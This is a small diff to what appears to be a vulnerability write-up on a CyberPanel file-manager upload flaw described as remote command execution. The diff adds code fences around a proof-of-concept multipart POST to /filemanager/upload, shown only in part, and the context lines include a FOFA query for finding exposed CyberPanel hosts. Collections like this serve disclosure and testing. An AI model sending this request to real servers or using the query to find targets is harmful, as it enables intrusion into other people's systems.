@@ -68,6 +68,7 @@ FOFA：app="CyberPanel"
 
 POC/EXP：
 
+```http
 POST /filemanager/upload HTTP/1.1
 Host: 127.0.0.1
 Content-Type: multipart/form-data; boundary=----NewBoundary123456789
@@ -85,6 +86,7 @@ Content-Disposition: form-data; name="file"; filename="poc.txt"
 
 pwn
 ------NewBoundary123456789--
+```
 
 ![image-20241101112321259](./.resource/CyberPanelfilemanagerupload远程命令执行漏洞/media/image-20241101112321259.png)
 
